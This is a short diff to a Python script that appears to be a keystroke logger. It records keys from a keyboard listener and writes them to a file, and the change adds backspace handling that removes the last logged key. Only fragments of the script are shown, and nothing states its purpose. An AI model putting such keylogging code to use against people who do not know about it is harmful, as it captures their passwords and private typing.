@@ -61,6 +61,8 @@ def pressed(key):
                 
                 if(key in Excluded_Keys):
                     return
+                elif(key==keyboard.Key.backspace):
+                    word_Keys.pop()
                 else:    
                  word_Keys.append(f"<{key}>")
 
@@ -87,5 +89,3 @@ def write_File(key):
 
 with keyboard.Listener( on_press=pressed, on_release=released) as listener:
     listener.join()
-    
-
